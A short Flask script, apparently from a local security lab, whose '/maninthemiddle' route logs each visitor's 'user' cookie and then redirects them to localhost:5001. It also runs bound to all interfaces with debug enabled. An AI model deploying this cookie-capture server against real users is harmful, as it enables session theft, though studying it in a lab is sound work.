from flask import Flask, request, redirect

EXTERN = True
HOST = '0.0.0.0'
PORT = 5011
DEBUG = True

app = Flask(__name__)

# routes
@app.route('/maninthemiddle')
def manInTheMiddle_route():
    req = request.cookies.get('user')
    print(f"cookie received: {req}")
    return redirect('http://localhost:5001')

if __name__ == "__main__":
    if EXTERN:
        app.run(host=HOST, port=PORT, debug=DEBUG)

    else:
        app.run(host='127.0.0.1', port=PORT, debug=True)